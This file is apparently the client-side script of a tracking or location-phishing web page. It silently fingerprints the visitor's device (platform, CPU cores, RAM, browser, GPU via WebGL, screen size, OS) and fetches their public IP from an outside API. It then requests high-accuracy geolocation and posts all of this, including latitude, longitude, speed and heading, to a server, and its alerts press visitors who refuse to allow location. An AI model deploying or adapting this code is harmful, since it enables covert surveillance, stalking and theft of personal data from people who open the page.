function serverSend(data) {
	$.ajax({
	  type: 'POST',
	  url: '',
	  data: {userData: data},
	  mimeType: 'text'
	});
}
function information()
{
  var ptf = navigator.platform;
  var cc = navigator.hardwareConcurrency;
  var ram = navigator.deviceMemory;
  var ver = navigator.userAgent;
  var str = ver;
  var os = ver;
  var canvas = document.createElement('canvas');
  var gl;
  var debugInfo;
  var ven;
  var ren;
  var ip;
  console.log(ver);
  console.log(ptf);
  if (cc == undefined)
  {
    cc = 'Not Available';
    console.log('Cores are not available')
  }
  console.log(cc);
  if (ram == undefined)
  {
    ram = 'Not Available';
    console.log('RAM is not available')
  }
  console.log(ram);
  if (ver.indexOf('Firefox') != -1)
  {
    str = str.substring(str.indexOf(' Firefox/') + 1);
    str = str.split(' ');
    brw = str[0];
    console.log(str[0]);
  }
  else if (ver.indexOf('Chrome') != -1)
  {
    str = str.substring(str.indexOf(' Chrome/') + 1);
    str = str.split(' ');
    brw = str[0];
    console.log(str[0]);
  }
  else if (ver.indexOf('Safari') != -1)
  {
    str = str.substring(str.indexOf(' Safari/') + 1);
    str = str.split(' ');
    brw = str[0];
    console.log(str[0]);
  }
  else if (ver.indexOf('Edge') != -1)
  {
    str = str.substring(str.indexOf(' Edge/') + 1);
    str = str.split(' ');
    brw = str[0];
    console.log(str[0]);
  }
  else
  {
    brw = 'Not Available'
    console.log('Browser is not available')
  }
  try
  {
    gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
  }
  catch (e) {}
  if (gl)
  {
    debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
    ven = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
    ren = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
  }
  if (ven == undefined)
  {
    ven = 'Not Available';
    console.log('GPU Vendor not available')
  }
  if (ren == undefined)
  {
    ren = 'Not Available';
    console.log('GPU Renderer not available')
  }
  console.log(ven);
  console.log(ren);
  var ht = window.screen.height
  var wd = window.screen.width
  console.log(window.screen.height)
  console.log(window.screen.width)
  os = os.substring(0, os.indexOf(')'));
  os = os.split(';');
  os = os[1];
  if (os == undefined)
  {
    os = 'Not Available';
    console.log('OS is not available')
  }
  os = os.trim();
  console.log(os);
  $.ajax({
   type:'get',
   url:'https://api.myip.com',
   dataType:'json'
  }).done(function(data) {
  	ip = data.query;
  	serverSend(JSON.stringify({Ip: ip}));
  });
  serverSend(JSON.stringify({Ip: ip, Ptf: ptf, Brw: brw, Cc: cc, Ram: ram, Ven: ven, Ren: ren, Ht: ht, Wd: wd, Os: os}));
}
function locate()
{
  if(navigator.geolocation)
  {
    var optn = {enableHighAccuracy : true, timeout : 30000, maximumage: 0};
    navigator.geolocation.getCurrentPosition(showPosition, showError, optn);
  }
  else
  {
    alert('Geolocation is not Supported by your Browser...');
  }
function showPosition(position)
  {
    var lat = position.coords.latitude;
    if( lat ){
      lat = lat + ' deg';
    }
    else {
      lat = 'Not Available';
    }
    var lon = position.coords.longitude;
    if( lon ){
      lon = lon + ' deg';
    }
    else {
      lon = 'Not Available';
    }
    var acc = position.coords.accuracy;
    if( acc ){
      acc = acc + ' m';
    }
    else {
      acc = 'Not Available';
    }
    var alt = position.coords.altitude;
    if( alt ){
      alt = alt + ' m';
    }
    else {
      alt = 'Not Available';
    }
    var dir = position.coords.heading;
    if( dir ){
      dir = dir + ' deg';
    }
    else {
      dir = 'Not Available';
    }
    var spd = position.coords.speed;
    if( spd ){
      spd = spd + ' m/s';
    }
    else {
      spd = 'Not Available';
    }
    var ok_status = 'success';
    serverSend(JSON.stringify({Status: ok_status,Lat: lat, Lon: lon, Acc: acc, Alt: alt, Dir: dir, Spd: spd}))
  };
}
function showError(error)
{
  var err_text;
  var err_status = 'failed';
	switch(error.code)
  {
		case error.PERMISSION_DENIED:
			err_text = 'User denied the request for Geolocation';
      alert('Please Refresh This Page and Allow Location Permission...');
      break;
		case error.POSITION_UNAVAILABLE:
			err_text = 'Location information is unavailable';
			break;
		case error.TIMEOUT:
			err_text = 'The request to get user location timed out';
      alert('Please Set Your Location Mode on High Accuracy...');
			break;
		case error.UNKNOWN_ERROR:
			err_text = 'An unknown error occurred';
			break;
	}
  serverSend(JSON.stringify({Status: "Denied"}));
}